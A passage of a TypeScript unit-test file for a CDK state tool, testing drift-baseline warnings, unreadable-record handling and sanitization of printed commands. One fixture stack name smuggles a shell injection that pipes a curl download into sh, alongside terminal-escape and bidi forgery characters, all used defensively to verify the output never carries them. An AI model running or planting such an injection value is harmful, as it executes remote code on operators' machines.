    // the joined form passes when both names land in ONE message — which is the
    // defect. `1 of 3` twice over is the discriminator: a single combined warn
    // would say `2 of 3`.
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'S',
        region: 'r',
        resources: {
          Baselined: {
            physicalId: 'p1',
            resourceType: 'AWS::S3::Bucket',
            properties: {},
            observedProperties: {},
          },
          Refreshable: { physicalId: 'p2', resourceType: 'AWS::SQS::Queue', properties: {} },
          Refused: {
            physicalId: 'p3',
            resourceType: 'AWS::SSM::Parameter',
            properties: {},
            observedBaselineRefused: true,
          },
        },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );

    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
    const refreshAdvice = messages.find((m) => m.includes('refresh-observed'));
    const refusalAdvice = messages.find((m) => m.includes('REFUSED'));
    expect(refreshAdvice).toBeDefined();
    expect(refusalAdvice).toBeDefined();

    // The refresh advice counts and names ONLY the refreshable one.
    expect(refreshAdvice).toMatch(/1 of 3 resource\(s\)/);
    expect(messages.some((m) => m.trim() === 'Refreshable')).toBe(true);

    // The refusal segment counts and names ONLY the refused one, and says the
    // refresh command will decline it — the sentence that stops the user
    // running it and concluding cdkd is broken.
    expect(refusalAdvice).toMatch(/1 of 3 resource\(s\)/);
    expect(refusalAdvice).toMatch(/will decline them/);
    expect(messages.some((m) => m.trim() === 'Refused')).toBe(true);
  });

  // Issue #3465: "deploy a change" is the remedy for the `incomplete-resolution`
  // class only. An `unverifiable-parameter` refusal survives every in-place
  // update, and a reason-less one (an older cdkd's) may, so each refused id
  // must sit under the remedy that is true for it.
  function refusedRecord(reason?: 'unverifiable-parameter' | 'incomplete-resolution') {
    return {
      physicalId: 'p',
      resourceType: 'AWS::SSM::Parameter',
      properties: {},
      observedBaselineRefused: true,
      ...(reason !== undefined ? { observedBaselineRefusalReason: reason } : {}),
    };
  }
  function refusedWarnings(
    resources: Record<string, unknown>,
    template?: Record<string, unknown>
  ): string[] {
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'S',
        region: 'r',
        resources: resources as never,
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>,
      undefined,
      template
    );
    return logger.warn.mock.calls.map((c) => String(c[0]));
  }

  it('keeps the deploy-a-change remedy for an incomplete-resolution refusal (issue #3465)', () => {
    const messages = refusedWarnings({ Held: refusedRecord('incomplete-resolution') });
    expect(messages).toHaveLength(2);
    expect(messages[0]).toMatch(/REFUSED/);
    expect(messages[0]).toMatch(/Deploy a change to each one to restore its baseline\.$/);
    expect(messages[1]).toBe('  Held');
  });

  it('does NOT tell an unverifiable-parameter refusal that a deploy clears it (issue #3465)', () => {
    const messages = refusedWarnings({ Held: refusedRecord('unverifiable-parameter') });
    expect(messages).toHaveLength(2);
    expect(messages[0]).toMatch(/REFUSED/);
    expect(messages[0]).not.toMatch(/Deploy a change to each one/);
    expect(messages[0]).toMatch(/in plaintext\. For each one: Deploying a change does NOT clear this refusal/);
    expect(messages[0]).toMatch(/replaces the resource/);
    expect(messages[1]).toBe('  Held');
  });

  it('hedges a reason-less refusal on whether the resource reads a template parameter (issue #3465)', () => {
    const messages = refusedWarnings({ Held: refusedRecord() });
    expect(messages[0]).not.toMatch(/Deploy a change to each one/);
    expect(messages[0]).toMatch(/recorded without a reason/);
    expect(messages[0]).toMatch(/unless the resource reads a template parameter/);
  });

  it('groups a MIXED refused list by remedy in a FIXED class order, each id under its own (issue #3465)', () => {
    // Record order interleaves the classes AND puts the reason-less one before
    // the unverifiable-parameter one, so record order does not yield the
    // asserted group order, and one remedy for the whole list misplaces an id.
    const messages = refusedWarnings({
      Legacy: refusedRecord(),
      Clearable: refusedRecord('incomplete-resolution'),
      Sticky: refusedRecord('unverifiable-parameter'),
      Clearable2: refusedRecord('incomplete-resolution'),
    });
    expect(messages[0]).toMatch(/^4 of 4 resource\(s\) had their baseline REFUSED/);
    expect(messages[0]).toMatch(/The remedy depends on why each one was refused\.$/);
    expect(messages.slice(1)).toEqual([
      '2 of them — deploy a change to each one to restore its baseline.',
      '  Clearable',
      '  Clearable2',
      expect.stringMatching(/^1 of them — for each one: Deploying a change does NOT clear this refusal/),
      '  Sticky',
      expect.stringMatching(/^1 of them — for each one: This refusal was recorded without a reason/),
      '  Legacy',
    ]);
  });

  // With the template export migrates against, a REASON-LESS refusal is
  // classified the way the next deploy reads it (issue #3465):
  // `resourcesNamingDeclaredParameter` over that template, failing closed.
  const PARAM_TEMPLATE = {
    Parameters: { Env: { Type: 'String', Default: 'dev' } },
    Resources: {
      ReadsParam: { Type: 'AWS::SSM::Parameter', Properties: { Value: { Ref: 'Env' } } },
      ReadsParamClearable: {
        Type: 'AWS::SSM::Parameter',
        Properties: { Value: { Ref: 'Env' } },
      },
      Plain: { Type: 'AWS::SSM::Parameter', Properties: { Value: 'literal' } },
    },
  };

  it('classifies a reason-less refusal whose template definition names a declared parameter as sticky (issue #3465)', () => {
    const messages = refusedWarnings({ ReadsParam: refusedRecord() }, PARAM_TEMPLATE);
    expect(messages).toHaveLength(2);
    expect(messages[0]).toMatch(/For each one: Deploying a change does NOT clear this refusal/);
    expect(messages[0]).not.toMatch(/recorded without a reason/);
    expect(messages[1]).toBe('  ReadsParam');
  });

  it('classifies a reason-less refusal whose template definition names no parameter as deploy-clearable (issue #3465)', () => {
    const messages = refusedWarnings({ Plain: refusedRecord() }, PARAM_TEMPLATE);
    expect(messages).toHaveLength(2);
    expect(messages[0]).toMatch(/Deploy a change to each one to restore its baseline\.$/);
    expect(messages[0]).not.toMatch(/recorded without a reason/);
    expect(messages[1]).toBe('  Plain');
  });

  it('splits reason-less refusals by the template, each beside its own class (issue #3465)', () => {
    const messages = refusedWarnings(
      {
        ReadsParam: refusedRecord(),
        Plain: refusedRecord(),
        Clearable: refusedRecord('incomplete-resolution'),
        Sticky: refusedRecord('unverifiable-parameter'),
        // A RECORDED reason wins over the template: an incomplete-resolution
        // refusal stays deploy-clearable even where the template names a
        // parameter at that resource.
        ReadsParamClearable: refusedRecord('incomplete-resolution'),
      },
      PARAM_TEMPLATE
    );
    expect(messages.slice(1)).toEqual([
      '3 of them — deploy a change to each one to restore its baseline.',
      '  Plain',
      '  Clearable',
      '  ReadsParamClearable',
      expect.stringMatching(/^2 of them — for each one: Deploying a change does NOT clear/),
      '  ReadsParam',
      '  Sticky',
    ]);
  });

  it('keeps the hedged remedy for a reason-less row the template no longer defines (issue #3465)', () => {
    // The predicate answers "names no parameter" for an absent id, since the
    // deploy DELETES that resource; "deploy a change restores its baseline"
    // would be false of it.
    const messages = refusedWarnings({ Gone: refusedRecord() }, PARAM_TEMPLATE);
    expect(messages[0]).toMatch(/For each one: This refusal was recorded without a reason/);
    expect(messages[0]).not.toMatch(/Deploy a change to each one/);
  });

  it('fails CLOSED into the sticky class on an unreadable template, as the deploy does (issue #3465)', () => {
    const messages = refusedWarnings({ Plain: refusedRecord() }, { Resources: 'not-a-map' });
    expect(messages[0]).toMatch(/For each one: Deploying a change does NOT clear this refusal/);
  });

  it('caps the ids per remedy group, each group under its OWN cap (issue #3465)', () => {
    // Both groups exceed the cap, so a cap SHARED across groups (the first
    // group spending the whole budget) leaves the second short or empty.
    const resources: Record<string, unknown> = {};
    for (let i = 0; i < 25; i++) {
      resources[`Clearable${i}`] = refusedRecord('incomplete-resolution');
      resources[`Sticky${i}`] = refusedRecord('unverifiable-parameter');
    }
    const messages = refusedWarnings(resources);
    expect(messages.filter((m) => m.startsWith('  Clearable'))).toHaveLength(10);
    expect(messages.filter((m) => m.startsWith('  Sticky'))).toHaveLength(10);
    expect(messages.filter((m) => m === '  ... and 15 more')).toHaveLength(2);
  });

  /**
   * Issue [#3018](https://github.com/go-to-k/cdkd/issues/3018) item 2: an
   * ENTRY that is not an object.
   *
   * REACHABILITY is the part worth writing down, because it is narrower than
   * the issue body assumed and a case built on the body's shape passes
   * vacuously. `buildImportPlan` runs BEFORE this report and iterates the
   * TEMPLATE's resources, blocking every row whose `state.resources[logicalId]`
   * is falsy — so a `null` entry for an ordinary TEMPLATED resource aborts the
   * export with that far better message and never arrives here.
   *
   * What DOES arrive is every row that loop `continue`s before reading a state
   * entry, plus every row it never visits. The cases below use the simplest:
   * an entry the template does NOT declare (a stale row left by an orphan, a
   * rename, or a hand edit). The others are an `AWS::CDK::Metadata` row and a
   * Custom Resource row routed to `phase2Creates`.
   *
   * Only the `null` shape THREW; a string, a number or a list yields `undefined`
   * for `observedProperties` and was silently tallied as a resource missing its
   * baseline — advice that cannot help a row nothing can read. So the cases
   * below pin two different things under one name: crash prevention for `null`,
   * and correct CLASSIFICATION plus correct advice for the rest.
   *
   * This function is a non-blocking pre-flight warning, so it TOLERATES the
   * entry rather than refusing — the opposite call from `cdkd state
   * refresh-observed`'s on the same shape, and deliberately: refusing here
   * would replace the export flow's own refusals with a message about a
   * baseline report.
   */
  for (const [shape, entry] of [
    ['null', null],
    ['a string', 'ab'],
    ['an empty string', ''],
    ['a list', []],
    ['a populated list', [{ physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} }]],
    // JSON carries these too, and the filters are a PREDICATE rather than a
    // list of shapes: admitting numbers or booleans on either side of it
    // survived a null/string/list-only table.
    ['a number', 5],
    ['zero', 0],
    ['negative zero', -0],
    ['Infinity', Infinity],
    ['-Infinity', -Infinity],
    ['true', true],
    ['false', false],
    // An OBJECT with no resource type passes an object-ness test, which is why
    // the partition asks `isReadableResourceEntry` rather than `isReadableBag`:
    // with the weaker predicate this row is tallied as a resource missing its
    // baseline and sent to `refresh-observed`, which refuses the record over it.
    ['an object with no resourceType', { physicalId: 'p', properties: {} }],
  ] as const) {
    it(`reports an entry that is ${shape} rather than tallying or crashing on it`, () => {
      const logger = makeLogger();
      const run = () =>
        reportDriftBaselineGaps(
          {
            version: 10,
            stackName: 'S',
            region: 'r',
            resources: {
              Baselined: {
                physicalId: 'p1',
                resourceType: 'AWS::S3::Bucket',
                properties: {},
                observedProperties: {},
              },
              StaleRow: entry as never,
            },
            outputs: {},
            lastModified: 0,
          },
          logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
        );

      expect(run).not.toThrow();

      const messages = logger.warn.mock.calls.map((c) => String(c[0]));
      const unreadable = messages.find((m) => m.includes('not an object'));
      // NAMED, not silently skipped: the row is a real defect in the record and
      // the reader has to know which one it is.
      expect(unreadable).toBeDefined();
      expect(unreadable).toMatch(/1 of 2 resource\(s\)/);
      expect(messages.some((m) => m.trim() === 'StaleRow')).toBe(true);

      // ...and it must NOT be counted as a missing baseline. `Baselined` has
      // one, so a fix that left the unreadable entry in the tally would emit
      // the refreshable advice as well — advice that cannot help, pointing at a
      // row `cdkd state refresh-observed` now refuses outright.
      expect(messages.some((m) => m.includes('lack an'))).toBe(false);
    });
  }

  it('refuses to enumerate ENTRIES of a bag that is not a map', () => {
    // `Object.entries('abc')` is `[['0','a'],['1','b'],['2','c']]`, so listing
    // entries without asking whether the bag IS one reports rows named `0`,
    // `1`, `2` — the fabrication class closed elsewhere, re-opened inside a
    // message whose job is to name real rows. The bag warning is the right
    // output here, and it must be the ONLY one.
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'S',
        region: 'r',
        resources: 'abc' as never,
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );

    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
    expect(messages.some((m) => m.includes("no readable 'resources' map"))).toBe(true);
    // No invented rows, and no entry-level report at all.
    expect(messages.some((m) => m.includes('not an object'))).toBe(false);
    expect(messages.some((m) => m.includes('cannot be read as resources'))).toBe(false);
    for (const invented of ['  0', '  1', '  2']) {
      expect(messages, `the bag was enumerated and invented the row ${invented.trim()}`).not.toContain(
        invented
      );
    }
  });

  // Every unreadable BAG shape, and the ones that matter most are those that
  // enumerate to NO entries. The guard used to sit after an
  // `entries.length === 0` return, so only a non-empty string or a populated
  // list could reach it — `null`, a number, a boolean, `''` and `[]` all
  // returned in silence, and the case above (a non-empty string) could not tell.
  for (const [shape, bag] of [
    ['null', null],
    ['absent', undefined],
    ['a number', 5],
    ['zero', 0],
    ['true', true],
    ['false', false],
    ['an empty string', ''],
    ['an empty list', []],
    ['a populated list', [{ physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} }]],
  ] as const) {
    it(`warns about a bag that is ${shape}, rather than returning in silence`, () => {
      const logger = makeLogger();
      reportDriftBaselineGaps(
        {
          version: 10,
          stackName: 'S',
          region: 'r',
          resources: bag as never,
          outputs: {},
          lastModified: 0,
        },
        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
      );
      const messages = logger.warn.mock.calls.map((c) => String(c[0]));
      expect(messages).toHaveLength(1);
      expect(messages[0]).toContain("no readable 'resources' map");
    });
  }

  it('says NOTHING about an empty map — the guard is not a blanket warning', () => {
    // `{}` is what a deployed-nothing stack holds. With the bag guard moved
    // ahead of the empty-record return, a guard that tested emptiness rather
    // than shape would warn here, and every case above would stay green.
    const logger = makeLogger();
    reportDriftBaselineGaps(
      { version: 10, stackName: 'S', region: 'r', resources: {}, outputs: {}, lastModified: 0 },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );
    expect(logger.warn).not.toHaveBeenCalled();
  });

  it('holes the REGION in the read command and withholds the write on it, never a sanitized spelling', () => {
    // The stack name has hostile, oversized and blank fixtures at every
    // position; the region did not, so the raw value, the stack's cap or an
    // unquoted region at this call site all left those cases green. Driven
    // through all three commands: the inspect command (an unreadable entry),
    // the refresh advice (a missing baseline) and the bag warning.
    const REGION = `us${String.fromCharCode(0x1b)} east'1${'R'.repeat(5000)}`;
    // The two READ commands. The refresh advice is the third command and WRITES,
    // so a region that rendering altered withholds it — asserted after the loop.
    for (const resources of [
      { BrokenRow: null as never },
      'abc' as never,
    ] as ReadonlyArray<StackState['resources']>) {
      const logger = makeLogger();
      reportDriftBaselineGaps(
        { version: 10, stackName: 'S', region: REGION, resources, outputs: {}, lastModified: 0 },
        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
      );
      const command = logger.warn.mock.calls
        .map((c) => String(c[0]))
        .find((m) => m.includes('--stack-region'));
      expect(command).toBeDefined();
      expect(command).not.toContain(String.fromCharCode(0x1b));
      // A HOLE, not a sanitized spelling, since go-to-k/cdkd#3436's fold-in.
      // The site used to print `shellQuote(safeRegion(region))` -- the altered
      // value, cut at 128 -- which is the "never the altered spelling"
      // half of the rule the shared gate enforces: a region rendering CHANGED
      // addresses a different record than the message means. The escape and
      // the over-cap length each make this value inexact on their own, and
      // the quote alone would be refused by `plainIdent` as `not-plain`, so it
      // is withheld on three counts rather than respelled.
      // Scoped to the COMMAND, not the whole message: the prose still DISPLAYS
      // the sanitized region beside it, which is go-to-k/cdkd#3232's class and
      // not this one. What must never carry an altered spelling is the text an
      // operator pastes.
      const commandSpan = command!.slice(command!.indexOf('cdkd state show'));
      expect(commandSpan).toContain(`--stack-region '<region>'`);
      expect(commandSpan, 'an altered spelling must never be NAMED in a command').not.toMatch(
        /R{3,}/
      );
      expect(commandSpan).not.toContain('us  east');
    }

    const refresh = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'S',
        region: REGION,
        resources: {
          Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
        },
        outputs: {},
        lastModified: 0,
      },
      refresh as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );
    const advice = refresh.warn.mock.calls.map((c) => String(c[0])).join('\n');
    expect(advice).not.toContain('cdkd state refresh-observed S');
    expect(advice).toContain('The command is not printed');
  });

  it('builds every command from the LOADED identity it is given, not the record body', () => {
    // Pins the function. The two `cdkd export` call sites that hand it the
    // loaded stack and region are pinned through the real command in
    // `tests/unit/cli/export-non-interactive-confirm.test.ts`.
    // `cdkd state refresh-observed` WRITES, and the body's `stackName` and
    // `region` are hand-editable fields of a record this report may be calling
    // broken. Built from the body, a record loaded as `App` in us-east-1 whose
    // body said `Other` / eu-west-1 sent the reader to rewrite a different
    // record. Every command shape: the inspect command, the refresh advice and
    // the bag warning.
    const RECORDS: ReadonlyArray<StackState['resources']> = [
      { BrokenRow: null as never },
      { Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} } },
      'abc' as never,
    ];
    for (const resources of RECORDS) {
      const logger = makeLogger();
      reportDriftBaselineGaps(
        {
          version: 10,
          stackName: 'Other',
          region: 'eu-west-1',
          resources,
          outputs: {},
          lastModified: 0,
        },
        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>,
        { stackName: 'App', region: 'us-east-1' }
      );
      const text = logger.warn.mock.calls.map((c) => String(c[0])).join('\n');
      expect(text).toMatch(/cdkd state (show|refresh-observed) App --stack-region us-east-1/);
      expect(text).not.toContain('Other');
      expect(text).not.toContain('eu-west-1');
    }
  });

  for (const loadedRegion of [undefined, ''] as const) {
  it(`names NO region when the loaded region is ${JSON.stringify(loadedRegion)}, even if the body has one`, () => {
    // A loaded identity is authoritative whole: a region-less LOAD must not
    // fall back to the body's region, which is the hand-editable value the
    // identity exists to replace.
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'Other',
        region: 'eu-west-1',
        resources: { BrokenRow: null as never },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>,
      { stackName: 'App', region: loadedRegion }
    );
    const text = logger.warn.mock.calls.map((c) => String(c[0])).join('\n');
    // `''` is what `pickStackRegion` returns for a lone legacy record with no
    // synth region; sanitized, it would render `--stack-region '<unrenderable>'`.
    expect(text).toContain('cdkd state show App --json');
    expect(text).not.toContain('--stack-region');
    expect(text).not.toContain('eu-west-1');
    // ...and the region-less arm of the read command still holds the stack
    // to `plainIdent`: a loaded name that renders exactly but is not plain is
    // a hole there too (the arm is a separate argument list from the
    // region-carrying one, so it needs its own pin).
    const holed = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'Other',
        region: 'eu-west-1',
        resources: { BrokenRow: null as never },
        outputs: {},
        lastModified: 0,
      },
      holed as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>,
      { stackName: "It's Stack", region: loadedRegion }
    );
    const holedText = holed.warn.mock.calls.map((c) => String(c[0])).join('\n');
    expect(holedText).toContain("cdkd state show '<stack>' --json");
    expect(holedText).not.toContain("Stack' --json");
  });
  }

  it('omits --stack-region rather than inventing one for a record that names no region', () => {
    // A pre-v2 record carries no `region`. A placeholder in its place makes the
    // pasted command refuse, so both commands this report builds drop the flag
    // instead — the inspect command and the refresh advice alike, since they
    // share one reference.
    const RECORDS: ReadonlyArray<StackState['resources']> = [
      { BrokenRow: null as never },
      { Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} } },
      // The BAG warning too, which the shared module builds rather than this
      // function — so it has to be told there is no region, not handed a
      // placeholder standing in for one.
      'abc' as never,
    ];
    // ABSENT, and present but NOT A STRING: a hand-edited `"region": null`
    // passes an `!== undefined` test and rendered `--stack-region
    // '<unrenderable>'`, a flag that selects no record.
    for (const [resources, region] of RECORDS.flatMap(
      (r) =>
        [
          [r, undefined],
          [r, null],
          [r, 5],
          [r, true],
          [r, ['us-east-1']],
        ] as const
    )) {
      const logger = makeLogger();
      reportDriftBaselineGaps(
        {
          version: 10,
          stackName: 'S',
          ...(region !== undefined && { region: region as never }),
          resources,
          outputs: {},
          lastModified: 0,
        },
        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
      );
      const all = logger.warn.mock.calls.map((c) => String(c[0])).join('\n');
      expect(all).not.toContain('--stack-region');
      expect(all).not.toContain('unknown region');
      if (typeof resources === 'string' || 'BrokenRow' in (resources as object)) {
        // The READ command still names the stack alone. Not end-anchored: the
        // bag warning's command is followed by a sentence.
        expect(all).toMatch(/cdkd state show S --json(\s|$)/);
      } else {
        // The WRITING command is not printed at all: `refresh-observed` refuses
        // a region-less record, so the advice says to migrate first.
        expect(all).not.toMatch(/cdkd state refresh-observed \S/);
        expect(all).toContain('migrate it first with any cdkd write');
      }
    }
  });

  it('still tallies a readable resource that is missing its baseline beside an unreadable one', () => {
    // The other direction. Without this, a fix that dropped EVERY entry — or
    // returned early on the first unreadable one — leaves the cases above
    // green while silently disabling the report this function exists to make.
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'S',
        region: 'r',
        resources: {
          Refreshable: { physicalId: 'p2', resourceType: 'AWS::SQS::Queue', properties: {} },
          StaleRow: null as never,
        },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );

    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
    expect(messages.some((m) => m.includes('not an object'))).toBe(true);
    const refreshAdvice = messages.find((m) => m.includes('refresh-observed'));
    expect(refreshAdvice).toBeDefined();
    // `1 of 2`, not `2 of 2`: the denominator stays the record's own resource
    // count while the numerator counts only rows the advice can help.
    expect(refreshAdvice).toMatch(/1 of 2 resource\(s\)/);
    expect(messages.some((m) => m.trim() === 'Refreshable')).toBe(true);
    // ...and the advice must say REPAIR FIRST, because `cdkd state
    // refresh-observed` now refuses a record holding an unreadable entry — the
    // WHOLE record, not just that row. Telling the user to run it here would
    // send them to a command that declines, which is the complaint
    // go-to-k/cdkd#3018 opens with, one command over.
    expect(refreshAdvice).toContain('Repair the 1 unreadable record(s) named above first');
    expect(refreshAdvice).toContain('refuses a record that holds one');
  });

  it('sanitizes and caps the identifiers it prints, and holes a non-plain stack name in its command', () => {
    // Every identifier in this report comes out of the record: the logical ids
    // from the stored bag, `stackName` from the record body or the S3 key.
    // `ConsoleLogger` sanitizes a logger's extra ARGUMENTS, never the message
    // string these are interpolated into, so unsanitized they forge lines and
    // push the remedy command off the screen — and `stackName` additionally
    // lands INSIDE a command the text tells the user to paste.
    // `\u200b` (ZERO WIDTH SPACE) is the discriminator between the two
    // `displaySafe` modes, and without it this case passed with the ALLOWLIST
    // dropped: every other character here is removed by the denylist too, so
    // `displaySafe(value)` and `displaySafe(value, { asciiOnly: true })` agree
    // on them. The allowlist has no such residual; the denylist cannot reach an
    // invisible formatter at all.
    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
    const hostileId = `Evil${FORGERIES.join('')}Row`;
    for (const forge of FORGERIES) {
      expect(hostileId.includes(forge), `probe input lost ${JSON.stringify(forge)}`).toBe(true);
    }

    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: "Evil'; curl http://x|sh; echo '",
        region: 'r',
        resources: {
          [hostileId]: null as never,
          ['L'.repeat(5000)]: null as never,
          ['\u0000\u0001'.repeat(4)]: null as never,
          Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
        },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );

    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
    // Per MESSAGE, not over a joined string: joining with a newline would make
    // the `\n` assertion below fail on correct output and, worse, a joiner that
    // was not a forgery would make it pass vacuously.
    for (const message of messages) {
      for (const forge of FORGERIES) {
        expect(message, `a forged ${JSON.stringify(forge)} survived into: ${JSON.stringify(message)}`).not.toContain(forge);
      }
    }
    const all = messages.join('\n');
    // CAPPED, so one planted id cannot bury the rest of the report — at 255,
    // CloudFormation's own logical-id limit, not at a region's 128. A legitimate
    // 129-to-255-character CDK id cut shorter names a row the record does not
    // hold.
    expect(all).toContain(`${'L'.repeat(255)} [cut: 4745 more characters withheld]`);
    expect(all).not.toContain('L'.repeat(256));
    // An id with nothing renderable left becomes the named stand-in rather than
    // an empty bullet naming nothing.
    expect(all).toContain('<unrenderable>');
    // The stack name is a HOLE where it lands inside a command: the ASCII
    // allowlist keeps `\'`, `;` and `|`, so it renders exactly, and
    // `plainIdent` is what refuses it (M2 of the go-to-k/cdkd#3764 review) —
    // a shell-quoted spelling is what an operator strips, and a padded one
    // can spell a labelled line once the terminal wraps. The clause before
    // the command says what the hole stands for, and the name itself appears
    // nowhere in the report.
    const warns = logger.warn.mock.calls.map((c) => String(c[0]));
    const at = warns.findIndex((m) => m.startsWith('Inspect it with: '));
    // The explanation, then only the id rows, then the command's own line.
    const pointer = warns.findIndex((w) => w.endsWith('Inspect it with the command after the list below.'));
    expect(warns[pointer]).toContain("A quoted '<...>' hole in the command after the list below stands for");
    expect(pointer).toBeLessThan(at - 1);
    for (const row of warns.slice(pointer + 1, at)) expect(row).toMatch(/^ {2}\S/);
    const inspect = warns.join('\n');
    expect(inspect).not.toContain('curl');
    // The command is the WHOLE of its own warn — UNWRAPPED, the contract
    // `lock-contention-message.ts` states, and on a line of its OWN
    // (go-to-k/cdkd#3436), since a shell-quoted value sharing a line with
    // prose is what an apostrophe turns inside out. A `toContain` survives
    // the mutants that break it: prose appended after `--json`, the command
    // wrapped in quotes, or folded back into the prose warn.
    expect(warns[at]).toBe("Inspect it with: cdkd state show '<stack>' --stack-region r --json");
  });

  it('caps the NAMED unreadable ids and counts the rest', () => {
    // Eleven rows against a ten-name cap: without the cap a record with
    // hundreds of broken rows prints hundreds of lines, and the reader loses
    // the summary that says what to do.
    const logger = makeLogger();
    const resources: Record<string, unknown> = {};
    for (let i = 0; i < 11; i++) resources[`Broken${i}`] = null;
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'S',
        region: 'r',
        resources: resources as never,
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );

    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
    const named = messages.filter((m) => /^ {2}Broken\d+$/.test(m));
    expect(named).toHaveLength(10);
    expect(messages.some((m) => m.trim() === '... and 1 more')).toBe(true);
    expect(messages.some((m) => m.includes('11 of 11 resource(s)'))).toBe(true);
    // The command comes AFTER the whole list, the overflow summary included
    // (m2 of the go-to-k/cdkd#4011 review).
    const more = messages.findIndex((m) => m.trim() === '... and 1 more');
    expect(messages[more + 1]).toBe('Inspect it with: cdkd state show S --stack-region r --json');
  });

  it('sanitizes the ids in the REFRESHABLE and REFUSED lists too, not only the unreadable one', () => {
    // Three populations print ids, and an earlier cut planted a hostile id in
    // ONE of them: removing the sanitization from either of the other two left
    // every case green. The two here predate go-to-k/cdkd#3018 and are no less
    // reachable -- a logical id comes out of the same hand-edited record
    // whichever list it lands in.
    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
    const hostileRefreshable = `Refresh${FORGERIES.join('')}Me`;
    const hostileRefused = `Refused${FORGERIES.join('')}Row`;
    for (const forge of FORGERIES) {
      expect(hostileRefreshable.includes(forge) && hostileRefused.includes(forge)).toBe(true);
    }

    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'S',
        region: 'r',
        resources: {
          [hostileRefreshable]: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
          [hostileRefused]: {
            physicalId: 'p2',
            resourceType: 'AWS::SSM::Parameter',
            properties: {},
            observedBaselineRefused: true,
          },
        },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );

    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
    // Both lists were actually printed -- without this the assertions below
    // pass over output that never happened.
    expect(messages.some((m) => m.includes('lack an'))).toBe(true);
    expect(messages.some((m) => m.includes('REFUSED'))).toBe(true);
    for (const message of messages) {
      for (const forge of FORGERIES) expect(message).not.toContain(forge);
    }
  });

  it('never renders a PADDED id bare in any of its three lists', () => {
    // Sanitizing trims, so `Queue ` rendered bare would read as a healthy
    // `Queue` beside it. `displayLogicalId` quotes an id whose rendering
    // changed; each list gets its own padded id so one list's quoting cannot
    // satisfy another's assertion, and a plain id in each is the bare control.
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'S',
        region: 'r',
        resources: {
          'Torn ': null as never,
          TornPlain: null as never,
          'Fresh ': { physicalId: 'p1', resourceType: 'AWS::SQS::Queue', properties: {} },
          FreshPlain: { physicalId: 'p2', resourceType: 'AWS::SQS::Queue', properties: {} },
          'Held ': {
            physicalId: 'p3',
            resourceType: 'AWS::SSM::Parameter',
            properties: {},
            observedBaselineRefused: true,
          },
          HeldPlain: {
            physicalId: 'p4',
            resourceType: 'AWS::SSM::Parameter',
            properties: {},
            observedBaselineRefused: true,
          },
        },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );
    const rows = logger.warn.mock.calls.map((c) => String(c[0]));
    for (const name of ['Torn', 'Fresh', 'Held']) {
      expect(rows, `the ${name} list rendered its padded id bare`).toContain(`  "${name}"`);
      expect(rows, `the ${name} list quoted its plain control`).toContain(`  ${name}Plain`);
      expect(rows).not.toContain(`  ${name}`);
    }
  });

  it('caps the ids in the REFRESHABLE and REFUSED lists too', () => {
    // Sanitization and capping are separate halves of the same helper, and the
    // hostile-id case above exercises only the first: removing the CAP from
    // either of these two lists left every case green, because the only
    // oversized fixture was in the unreadable population.
    const longRefreshable = 'Q'.repeat(5000);
    const longRefused = 'Z'.repeat(5000);
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 10,
        stackName: 'S',
        region: 'r',
        resources: {
